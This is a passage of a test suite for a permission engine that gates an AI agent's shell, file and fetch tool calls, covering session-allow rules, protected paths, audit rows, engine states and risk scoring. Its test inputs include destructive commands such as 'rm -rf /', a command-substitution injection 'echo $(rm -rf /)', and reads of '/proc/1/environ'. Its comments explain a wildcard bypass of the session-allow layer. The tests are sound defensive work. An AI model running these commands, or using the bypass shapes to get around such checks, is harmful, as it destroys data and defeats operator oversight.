    // confirm in real life only because the harness mode promotes
    // default-deny to confirm; here we observe the engine's raw
    // verdict.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('bash', 'bash', { command: 'git push origin main' }).kind).toBe('deny');

    // Operator answers "Yes, don't ask again for: git push *" → bridge
    // calls addSessionAllow. Next check on a matching command is allow.
    eng.addSessionAllow('bash', 'git push *');
    const d = eng.check('bash', 'bash', { command: 'git push origin main' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({ layer: 'session', rule: 'git push *', section: 'bash' });
  });

  test('session-allow attribution carries layer="session" even when base section lives elsewhere', () => {
    // Engine built with bash section sourced from `project` provenance.
    // A session-allow override must report `layer: 'session'`, not
    // `'project'` — the modal / audit attribute the runtime override
    // correctly to the layer that actually produced it.
    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    eng.addSessionAllow('bash', 'pwd');
    const d = eng.check('bash', 'bash', { command: 'pwd' });
    expect(d.source?.layer).toBe('session');
  });

  test('deny still wins over session-allow', () => {
    // Operator session-allowing a pattern does NOT override deny.
    // This is the safety property: a runtime "yes" never lifts an
    // enterprise/project deny.
    const eng = createPermissionEngine(policy({ tools: { bash: { deny: ['rm -rf *'] } } }), {
      cwd: CWD,
    });
    eng.addSessionAllow('bash', 'rm -rf *');
    const d = eng.check('bash', 'bash', { command: 'rm -rf /' });
    expect(d.kind).toBe('deny');
  });

  test('session-allow shortcuts past the compound-command guard', () => {
    // Compound guard fires on `git status; pwd` by default. If the
    // operator session-allowed the literal compound (because they
    // already saw it once and accepted), the next occurrence skips
    // the modal. This is the whole point of session-allow — operator's
    // explicit trust beats the accidental-compound safety net.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
      cwd: CWD,
    });
    // Without session-allow: compound guard forces confirm even
    // though `*` would match.
    expect(eng.check('bash', 'bash', { command: 'git status; pwd' }).kind).toBe('confirm');
    // With session-allow on the literal: allow.
    eng.addSessionAllow('bash', 'git status; pwd');
    const d = eng.check('bash', 'bash', { command: 'git status; pwd' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({
      layer: 'session',
      rule: 'git status; pwd',
      section: 'bash',
    });
  });

  test('read_file session-allow promotes a path glob', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('read_file', 'fs.read', { path: 'src/foo.ts' }).kind).toBe('deny');
    eng.addSessionAllow('read_file', 'src/**');
    const d = eng.check('read_file', 'fs.read', { path: 'src/foo.ts' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({ layer: 'session', rule: 'src/**', section: 'read_file' });
  });

  test('write_file session-allow does not leak into read_file (per-section state)', () => {
    // Two sections, two independent allowlists. Promoting `src/**`
    // for write_file leaves read_file's state untouched — the bridge
    // routes by req.source.section, so cross-section aliasing would
    // be a real bug.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('write_file', 'src/**');
    expect(eng.check('write_file', 'fs.write', { path: 'src/x.ts' }).kind).toBe('allow');
    expect(eng.check('read_file', 'fs.read', { path: 'src/x.ts' }).kind).toBe('deny');
  });

  test('fetch_url session-allow promotes a host glob', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('fetch_url', 'web.fetch', { url: 'https://api.example.com/v1' }).kind).toBe(
      'deny',
    );
    eng.addSessionAllow('fetch_url', 'api.example.com');
    const d = eng.check('fetch_url', 'web.fetch', { url: 'https://api.example.com/v1' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({
      layer: 'session',
      rule: 'api.example.com',
      section: 'fetch_url',
    });
  });

  test('search-tool session-allow follows the same root-descends-into-glob semantics', () => {
    // grep rooted at `src` against allow `src/**` works because the
    // engine probes `src/<synthetic>` against the rule. Session-allow
    // funnels through the same matchTarget — so the runtime
    // promotion behaves identically to a base allow_paths entry.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('grep', 'src/**');
    expect(eng.check('grep', 'fs.read', { path: 'src' }).kind).toBe('allow');
  });

  test('escaped-literal session-allow does NOT broaden via wildcards (regression pin for the echo * bypass)', () => {
    // The bridge's escapeGlobMetacharacters wraps args.command
    // before promotion. This test pins the engine-level effect:
    //   - the escaped rule matches the original literal (operator
    //     doesn't get re-prompted)
    //   - the escaped rule does NOT match injection variants
    //     (`echo extra`, etc.) → default-deny falls through
    // Without escaping, the rule's `*` would be a wildcard and
    // would auto-allow the injection.
    //
    // Slice-6 change: `echo $(rm -rf /)` no longer hits the
    // session-allow / rule pipeline at all — the bash AST resolver
    // refuses `command_substitution` upstream. The bypass shape
    // closes via Refuse before the rule layer is even consulted.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('bash', 'echo \\*');
    // Original literal: allowed.
    expect(eng.check('bash', 'bash', { command: 'echo *' }).kind).toBe('allow');
    // Plain variant: NOT matched by the escaped rule, no other
    // rules to fall through to → default-deny.
    expect(eng.check('bash', 'bash', { command: 'echo file.txt' }).kind).toBe('deny');
    // Injection variant: resolver-refuse on `$(...)` before any
    // rule consults. Defense-in-depth — even if session-allow
    // had matched, the resolver would still refuse.
    expect(eng.check('bash', 'bash', { command: 'echo $(rm -rf /)' }).kind).toBe('deny');
  });

  test('UNESCAPED bare wildcard rule broadens for benign shapes but Refuse traps adversarial ones (slice 6)', () => {
    // Documents what the bridge's escaping prevents AND the new
    // belt-and-suspenders: session-allow with `echo *` (no
    // escape) DOES broaden to `echo file.txt` (the bridge bug
    // class the production code fixes by escaping). But the
    // adversarial shape `echo $(...)` is now caught by the bash
    // AST resolver — even if the bridge were buggy, the resolver
    // refuses the substitution before session-allow runs.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('bash', 'echo *');
    expect(eng.check('bash', 'bash', { command: 'echo *' }).kind).toBe('allow');
    expect(eng.check('bash', 'bash', { command: 'echo file.txt' }).kind).toBe('allow');
    // Adversarial: resolver-refuse upstream of session-allow.
    // Crucially NOT allow — the bridge's escape used to be the
    // only defense; now the resolver is a second wall.
    expect(eng.check('bash', 'bash', { command: 'echo $(rm -rf /)' }).kind).toBe('deny');
  });

  test('search-tool session-allow with bare-root pattern does NOT fire (regression pin)', () => {
    // Documents the bug the bridge's ensureDescendantGlob exists
    // to work around: a bare `<root>` rule (no `/**` suffix) never
    // matches the engine's synthetic-descendant probe. Engine
    // builds `src/.forja-check` as the match target; Bun.Glob
    // matches `src` only against exact `src`, so the rule never
    // fires. Without the bridge wrapping the promotion as `src/**`,
    // the operator's session-allow click would silently no-op.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('grep', 'src');
    // Bare-root rule: doesn't fire → falls through to default-deny.
    expect(eng.check('grep', 'fs.read', { path: 'src' }).kind).toBe('deny');
  });

  test('session-allow runs BEFORE base confirm rules (skips the modal)', () => {
    // Without session-allow the request would confirm. Operator's
    // session-allow short-circuits past the confirm — that's the
    // ergonomics win.
    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['git push *'] } } }), {
      cwd: CWD,
    });
    expect(eng.check('bash', 'bash', { command: 'git push origin main' }).kind).toBe('confirm');
    eng.addSessionAllow('bash', 'git push *');
    expect(eng.check('bash', 'bash', { command: 'git push origin main' }).kind).toBe('allow');
  });

  test('duplicate addSessionAllow calls do not grow the list', () => {
    // Operator may answer session-allow on the same rule twice
    // (different runs of the same agent step, modal racing, etc.).
    // The dedup keeps the list bounded across long sessions and
    // preserves the original rule's diagnostic position.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('bash', 'pwd');
    eng.addSessionAllow('bash', 'pwd');
    eng.addSessionAllow('bash', 'pwd');
    // Internal state isn't introspectable, but a successful match
    // proves the rule is there. The dedup is a hygiene property —
    // we exercise it via repeated calls to lock in that the API
    // accepts repeats without throwing.
    expect(eng.check('bash', 'bash', { command: 'pwd' }).kind).toBe('allow');
  });

  test('empty pattern is silently dropped', () => {
    // Defense-in-depth: bridge should never call us with empty
    // pattern, but if it does, the engine refuses to register a
    // rule that could be silently expanded into `*` by a future
    // refactor. Subsequent check default-denies as if no rule
    // had been added.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('bash', '');
    eng.addSessionAllow('bash', '   ');
    expect(eng.check('bash', 'bash', { command: 'pwd' }).kind).toBe('deny');
  });

  test('session-allow whitespace is trimmed before storage', () => {
    // The bridge takes patterns from PolicySource.rule which
    // originates from policy YAML; in principle whitespace is
    // already normalized, but loose user input through future
    // entry points (REPL command, hooks) could carry it. Trim
    // defensively so the matcher behaves the same regardless.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('bash', '  pwd  ');
    expect(eng.check('bash', 'bash', { command: 'pwd' }).kind).toBe('allow');
  });
});

describe('engine.check — protected paths (§11 integration)', () => {
  // Most tests cwd at /work/proj so we have a stable handle on
  // `.git/`, `.agent/`, `.claude/` for cwd-relative protected dirs.
  const PROJ = '/work/proj';
  const HOME = '/home/op';

  test('deny tier (/proc) blocks writes regardless of allow rule', () => {
    const eng = createPermissionEngine(
      policy({ tools: { write_file: { allow_paths: ['/**'] } } }),
      { cwd: PROJ, home: HOME },
    );
    const d = eng.check('write_file', 'fs.write', { path: '/proc/sys/kernel/randomize_va_space' });
    expect(d.kind).toBe('deny');
    if (d.kind === 'deny') {
      expect(d.reason).toContain('protected zone');
      expect(d.source?.section).toBe('protected');
    }
  });

  test('deny tier (/proc) blocks reads as well', () => {
    const eng = createPermissionEngine(policy({ tools: { read_file: { allow_paths: ['/**'] } } }), {
      cwd: PROJ,
      home: HOME,
    });
    const d = eng.check('read_file', 'fs.read', { path: '/proc/1/environ' });
    expect(d.kind).toBe('deny');
  });

  test('deny tier (/sys, /boot) blocks any op', () => {
    const eng = createPermissionEngine(
      policy({
        tools: {
          read_file: { allow_paths: ['/**'] },
          write_file: { allow_paths: ['/**'] },
        },
      }),
      { cwd: PROJ, home: HOME },
    );
    expect(eng.check('read_file', 'fs.read', { path: '/sys/class/net/lo' }).kind).toBe('deny');
    expect(eng.check('write_file', 'fs.write', { path: '/boot/grub.conf' }).kind).toBe('deny');
  });

  test('escalate tier (/etc) upgrades allow to confirm for writes', () => {
    const eng = createPermissionEngine(
      policy({ tools: { write_file: { allow_paths: ['/**'] } } }),
      { cwd: PROJ, home: HOME },
    );
    const d = eng.check('write_file', 'fs.write', { path: '/etc/hosts' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('protected zone');
      expect(d.reason).toContain('escalated');
      expect(d.source?.section).toBe('write_file');
      expect(d.source?.rule).toBe('/**');
    }
  });

  test('escalate tier (~/.bashrc) upgrades allow to confirm for writes', () => {
    const eng = createPermissionEngine(
      policy({ tools: { write_file: { allow_paths: ['/**'] } } }),
      { cwd: PROJ, home: HOME },
    );
    const d = eng.check('write_file', 'fs.write', { path: '/home/op/.bashrc' });
    expect(d.kind).toBe('confirm');
  });

  test('escalate tier passes reads through (no upgrade)', () => {
    const eng = createPermissionEngine(policy({ tools: { read_file: { allow_paths: ['/**'] } } }), {
      cwd: PROJ,
      home: HOME,
    });
    expect(eng.check('read_file', 'fs.read', { path: '/etc/hosts' }).kind).toBe('allow');
    expect(eng.check('read_file', 'fs.read', { path: '/home/op/.bashrc' }).kind).toBe('allow');
  });

  test('escalate tier upgrades session-allow to confirm too', () => {
    const eng = createPermissionEngine(policy({ tools: { write_file: { allow_paths: [] } } }), {
      cwd: PROJ,
      home: HOME,
    });
    eng.addSessionAllow('write_file', '/etc/hosts');
    const d = eng.check('write_file', 'fs.write', { path: '/etc/hosts' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.source?.layer).toBe('session');
    }
  });

  test('escalate tier blocks acceptEdits auto-accept', () => {
    // Without protected paths, acceptEdits would silently allow
    // a confirm_paths-matching write. With protected paths in play,
    // the auto-accept must NOT fire — §11 trumps acceptEdits.
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'acceptEdits' },
        tools: { write_file: { confirm_paths: ['/**'] } },
      }),
      { cwd: PROJ, home: HOME },
    );
    expect(eng.check('write_file', 'fs.write', { path: '/etc/hosts' }).kind).toBe('confirm');
    // Outside protected: acceptEdits still works.
    expect(eng.check('write_file', 'fs.write', { path: '/work/proj/src/foo.ts' }).kind).toBe(
      'allow',
    );
  });

  test('cwd-relative protected dirs (.git/, .agent/, .claude/) escalate writes', () => {
    const eng = createPermissionEngine(policy({ tools: { write_file: { allow_paths: ['**'] } } }), {
      cwd: PROJ,
      home: HOME,
    });
    expect(eng.check('write_file', 'fs.write', { path: '/work/proj/.git/HEAD' }).kind).toBe(
      'confirm',
    );
    expect(
      eng.check('write_file', 'fs.write', { path: '/work/proj/.agent/sessions.db' }).kind,
    ).toBe('confirm');
    expect(
      eng.check('write_file', 'fs.write', { path: '/work/proj/.claude/settings.json' }).kind,
    ).toBe('confirm');
  });

  test('unprotected paths are not affected', () => {
    const eng = createPermissionEngine(
      policy({
        tools: { write_file: { allow_paths: ['**'], confirm_paths: [] } },
        defaults: { mode: 'acceptEdits' },
      }),
      { cwd: PROJ, home: HOME },
    );
    expect(eng.check('write_file', 'fs.write', { path: '/work/proj/src/index.ts' }).kind).toBe(
      'allow',
    );
  });

  test('deny rule still wins over protected escalate', () => {
    const eng = createPermissionEngine(
      policy({
        tools: { write_file: { allow_paths: ['/**'], deny_paths: ['/etc/passwd'] } },
      }),
      { cwd: PROJ, home: HOME },
    );
    // /etc/passwd has BOTH a deny rule (specific) and an allow rule
    // (broad) AND is in the protected escalate tier. Outcome must
    // be deny — protected escalate doesn't downgrade a deny.
    const d = eng.check('write_file', 'fs.write', { path: '/etc/passwd' });
    expect(d.kind).toBe('deny');
  });
});

describe('engine.check — audit emission', () => {
  const PROJ = '/work/proj';
  const HOME = '/home/op';

  interface CapturedEmit {
    session_id: string;
    tool_name: string;
    decision: 'allow' | 'deny' | 'confirm';
    policy_hash: string;
    reason_chain: ReadonlyArray<{
      stage: string;
      layer?: string;
      rule?: string;
      section?: string;
      note?: string;
    }>;
  }

  const captureSink = (collected: CapturedEmit[]) => ({
    emit(input: CapturedEmit) {
      collected.push(input);
      return { seq: collected.length, this_hash: `fake-${collected.length}` };
    },
    verifyChain() {
      return { ok: true as const, rows: collected.length };
    },
  });

  test('emits one row per check call', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      sessionId: 'sess-x',
    });
    eng.check('bash', 'bash', { command: 'ls -la' });
    expect(collected.length).toBe(1);
    expect(collected[0]?.session_id).toBe('sess-x');
    expect(collected[0]?.tool_name).toBe('bash');
    expect(collected[0]?.decision).toBe('allow');
    expect(collected[0]?.policy_hash).toMatch(/^sha256:[0-9a-f]{64}$/);
  });

  test('reason_chain captures stage = static-rule for matched allow', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
    });
    eng.check('bash', 'bash', { command: 'ls -la' });
    expect(collected[0]?.reason_chain[0]?.stage).toBe('static-rule');
    expect(collected[0]?.reason_chain[0]?.rule).toBe('ls *');
    expect(collected[0]?.reason_chain[0]?.section).toBe('bash');
  });

  test('reason_chain captures stage = default-deny for unmatched', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({}), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
    });
    eng.check('bash', 'bash', { command: 'echo hi' });
    expect(collected[0]?.decision).toBe('deny');
    expect(collected[0]?.reason_chain[0]?.stage).toBe('default-deny');
  });

  test('reason_chain captures stage = protected-path for §11 deny', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(
      policy({ tools: { write_file: { allow_paths: ['/**'] } } }),
      { cwd: PROJ, home: HOME, audit: captureSink(collected) },
    );
    eng.check('write_file', 'fs.write', { path: '/proc/cpuinfo' });
    expect(collected[0]?.decision).toBe('deny');
    expect(collected[0]?.reason_chain[0]?.stage).toBe('protected-path');
  });

  test('reason_chain captures stage = session-allow for session-trusted', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({}), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
    });
    eng.addSessionAllow('bash', 'pwd');
    eng.check('bash', 'bash', { command: 'pwd' });
    expect(collected[0]?.decision).toBe('allow');
    expect(collected[0]?.reason_chain[0]?.stage).toBe('session-allow');
  });

  test('policy_hash is stable across multiple checks (same engine)', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
    });
    eng.check('bash', 'bash', { command: 'ls -la' });
    eng.check('bash', 'bash', { command: 'ls --color' });
    expect(collected[0]?.policy_hash).toBe(collected[1]?.policy_hash);
  });

  test('different policies produce different policy_hash', () => {
    const a: CapturedEmit[] = [];
    const b: CapturedEmit[] = [];
    const engA = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(a),
    });
    const engB = createPermissionEngine(policy({ tools: { bash: { allow: ['ls -la'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(b),
    });
    engA.check('bash', 'bash', { command: 'ls -la' });
    engB.check('bash', 'bash', { command: 'ls -la' });
    expect(a[0]?.policy_hash).not.toBe(b[0]?.policy_hash);
  });

  test('no-op default sink does not throw when no audit option supplied', () => {
    const eng = createPermissionEngine(policy({}), { cwd: PROJ, home: HOME });
    // Just exercising: production tests build engines without
    // audit and must continue to work.
    expect(() => eng.check('bash', 'bash', { command: 'ls -la' })).not.toThrow();
  });
});

describe('engine — state machine integration (§2)', () => {
  const PROJ = '/work/proj';
  const HOME = '/home/op';

  test('state() defaults to ready', () => {
    const eng = createPermissionEngine(policy({}), { cwd: PROJ, home: HOME });
    expect(eng.state()).toBe('ready');
  });

  test('initialState option pins the starting state', () => {
    const eng = createPermissionEngine(policy({}), {
      cwd: PROJ,
      home: HOME,
      initialState: 'init',
    });
    expect(eng.state()).toBe('init');
  });

  test.each(['init', 'loading-policy', 'validating-chain', 'refusing'] as const)(
    'state=%s denies every check with engine-state reason',
    (state) => {
      const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
        cwd: PROJ,
        home: HOME,
        initialState: state,
      });
      const d = eng.check('bash', 'bash', { command: 'ls -la' });
      expect(d.kind).toBe('deny');
      if (d.kind === 'deny') {
        expect(d.reason).toContain('engine not ready');
        expect(d.reason).toContain(`state=${state}`);
        expect(d.source?.section).toBe('engine-state');
      }
    },
  );

  test('degraded upgrades allow → confirm but preserves source attribution', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      initialState: 'ready',
    });
    eng.degrade('classifier_offline');
    expect(eng.state()).toBe('degraded');

    const d = eng.check('bash', 'bash', { command: 'ls -la' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('degraded state forced confirm');
      // Original rule attribution preserved
      expect(d.source?.rule).toBe('ls *');
      expect(d.source?.section).toBe('bash');
    }
  });

  test('degraded does NOT downgrade deny', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { deny: ['rm -rf *'] } } }), {
      cwd: PROJ,
      home: HOME,
      initialState: 'degraded',
    });
    const d = eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
    expect(d.kind).toBe('deny');
  });

  test('degraded does NOT change confirm', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['git push *'] } } }), {
      cwd: PROJ,
      home: HOME,
      initialState: 'degraded',
    });
    const d = eng.check('bash', 'bash', { command: 'git push origin main' });
    expect(d.kind).toBe('confirm');
  });

  test('degraded blocks bypass mode shortcut (defense in depth)', () => {
    // Use a known command so the bash AST resolver doesn't refuse
    // before the bypass / degraded short-circuit fires.
    const eng = createPermissionEngine(policy({ defaults: { mode: 'bypass' } }), {
      cwd: PROJ,
      home: HOME,
      initialState: 'degraded',
    });
    const d = eng.check('bash', 'bash', { command: 'ls' });
    expect(d.kind).toBe('confirm');
  });

  test('restore() returns from degraded to ready', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      initialState: 'ready',
    });
    eng.degrade('test_signal');
    eng.restore('subsystem_back');
    expect(eng.state()).toBe('ready');

    const d = eng.check('bash', 'bash', { command: 'ls -la' });
    expect(d.kind).toBe('allow');
  });

  test('refuse() makes engine terminal — all checks deny', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      initialState: 'ready',
    });
    eng.refuse('chain_break_detected');
    expect(eng.state()).toBe('refusing');

    const d = eng.check('bash', 'bash', { command: 'ls -la' });
    expect(d.kind).toBe('deny');
    if (d.kind === 'deny') {
      expect(d.source?.section).toBe('engine-state');
    }
  });

  test('refusing is terminal — cannot restore', () => {
    const eng = createPermissionEngine(policy({}), {
      cwd: PROJ,
      home: HOME,
      initialState: 'ready',
    });
    eng.refuse('test');
    expect(() => eng.restore('try_again')).toThrow(/invalid transition/);
  });

  test('audit row carries engine-state stage when degraded fires', () => {
    interface CapturedEmit {
      decision: 'allow' | 'deny' | 'confirm';
      reason_chain: ReadonlyArray<{ stage: string; note?: string }>;
    }
    const collected: CapturedEmit[] = [];
    const sink = {
      emit(input: CapturedEmit) {
        collected.push(input);
        return { seq: collected.length, this_hash: `fake-${collected.length}` };
      },
      verifyChain() {
        return { ok: true as const, rows: collected.length };
      },
    };
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: sink,
      initialState: 'degraded',
    });
    eng.check('bash', 'bash', { command: 'ls -la' });
    expect(collected[0]?.decision).toBe('confirm');
    // First entry is the original static-rule attribution; the
    // risk-score stage lands between when the engine is degraded
    // (score > 0 from `engine_degraded` feature); engine-state is
    // last. Search by stage rather than index to keep the test
    // resilient to future chain-entry additions.
    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
    expect(stages[0]).toBe('static-rule');
    expect(stages).toContain('engine-state');
    const engineStateEntry = collected[0]?.reason_chain.find((e) => e.stage === 'engine-state');
    expect(engineStateEntry?.note).toContain('degraded');
  });
});

describe('engine — risk score in audit row (§6.3 integration)', () => {
  const PROJ = '/work/proj';
  const HOME = '/home/op';

  interface CapturedEmit {
    decision: 'allow' | 'deny' | 'confirm';
    score?: number;
    score_components?: Record<string, number>;
    reason_chain: ReadonlyArray<{ stage: string; note?: string }>;
  }

  const captureSink = (collected: CapturedEmit[]) => ({
    emit(input: CapturedEmit) {
      collected.push(input);
      return { seq: collected.length, this_hash: `fake-${collected.length}` };
    },
    verifyChain() {
      return { ok: true as const, rows: collected.length };
    },
  });

  test('read_file produces score 0 baseline', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { read_file: { allow_paths: ['**'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
    });
    eng.check('read_file', 'fs.read', { file_path: 'src/index.ts' });
    expect(collected[0]?.score).toBe(0);
    expect(collected[0]?.score_components).toEqual({});
  });

  test('bash rm carries capability_risk + blocklist_command', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['rm *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
    });
    eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
    const components = collected[0]?.score_components ?? {};
    expect(components.capability_risk).toBeGreaterThan(0);
    expect(components.blocklist_command).toBeGreaterThan(0);
    expect(collected[0]?.score).toBeGreaterThan(0.5);
  });

  test('MCP tool prefix triggers mcp_tool feature', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({}), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
    });
    // mcp__ prefix → defaultIsMcpTool returns true → mcp_tool feature
    // The fallback Conservative resolver also fires (registry has no
    // resolver) which adds confidence_low. Mostly we want
    // mcp_tool present.
    eng.check('mcp__github__create_issue', 'misc', {});
    expect(collected[0]?.score_components?.mcp_tool).toBe(0.1);
  });

  test('custom trustedHosts narrows untrusted_egress', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['curl *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      trustedHosts: ['internal.corp'],
    });
    eng.check('bash', 'bash', { command: 'curl https://internal.corp/data' });
    expect(collected[0]?.score_components?.untrusted_egress).toBeUndefined();
    eng.check('bash', 'bash', { command: 'curl https://github.com/repo' });
    // github.com NOT in this custom list → untrusted
    expect(collected[1]?.score_components?.untrusted_egress).toBeGreaterThan(0);
  });

  test('reason chain gets a risk-score entry when score > 0', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['rm *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
    });
    eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
    expect(stages).toContain('risk-score');
    const entry = collected[0]?.reason_chain.find((e) => e.stage === 'risk-score');
    expect(entry?.note).toMatch(/^score=0\.\d+$/);
  });

  test('zero-score path does NOT add a risk-score chain entry', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { read_file: { allow_paths: ['**'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
    });
    eng.check('read_file', 'fs.read', { file_path: 'src/index.ts' });
    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
    expect(stages).not.toContain('risk-score');
  });

  test('degraded state adds engine_degraded to components', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { read_file: { allow_paths: ['**'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      initialState: 'degraded',
    });
    eng.check('read_file', 'fs.read', { file_path: 'src/foo.ts' });
    expect(collected[0]?.score_components?.engine_degraded).toBe(0.2);
  });

  test('recentToolErrors propagates to recent_errors feature', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      recentToolErrors: 5,
    });
    eng.check('bash', 'bash', { command: 'ls -la' });
    expect(collected[0]?.score_components?.recent_errors).toBe(0.15);
  });

  test('state-rejecting check emits score=0 (no resolver / no compute)', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({}), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      initialState: 'refusing',
    });
    eng.check('bash', 'bash', { command: 'rm -rf /' });
    // Deny shape per slice 2 — score not computed since the gate
    // rejected the call before the resolver/scoring pipeline.
    expect(collected[0]?.decision).toBe('deny');
    expect(collected[0]?.score).toBe(0);
    expect(collected[0]?.score_components).toEqual({});
  });
});

describe('engine — classifier hint (§6.4 integration)', () => {
  const PROJ = '/work/proj';
  const HOME = '/home/op';

  interface CapturedEmit {
    decision: 'allow' | 'deny' | 'confirm';
    score?: number;
    classifier_hash?: string | null;
    classifier_adjust?: number | null;
    reason_chain: ReadonlyArray<{ stage: string; note?: string }>;
  }

  const captureSink = (collected: CapturedEmit[]) => ({
    emit(input: CapturedEmit) {
      collected.push(input);
      return { seq: collected.length, this_hash: `fake-${collected.length}` };
    },
    verifyChain() {
      return { ok: true as const, rows: collected.length };
    },
  });

  test('classifier adjust lands in audit row and adjusts score', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['rm *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      classifier: () => ({ score_adjust: -0.15, reason: 'benign cleanup' }),
      classifierHash: 'v1',
    });
    eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
    expect(collected[0]?.classifier_hash).toBe('v1');
    expect(collected[0]?.classifier_adjust).toBe(-0.15);
    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
    expect(stages).toContain('classifier');
    const entry = collected[0]?.reason_chain.find((e) => e.stage === 'classifier');
    expect(entry?.note).toContain('adjust=-0.15');
    expect(entry?.note).toContain('benign cleanup');
  });

  test('positive adjust clamped at +0.2', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { read_file: { allow_paths: ['**'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      classifier: () => ({ score_adjust: 0.99, reason: 'looks risky' }),
    });
    eng.check('read_file', 'fs.read', { file_path: 'src/x.ts' });
    expect(collected[0]?.classifier_adjust).toBe(0.2);
  });

  test('negative adjust clamped at -0.2', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['rm *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      classifier: () => ({ score_adjust: -5.0, reason: 'totally safe' }),
    });
    eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
    expect(collected[0]?.classifier_adjust).toBe(-0.2);
  });

  test('classifier returns null → classifier-unavailable, lenient default keeps engine ready', () => {
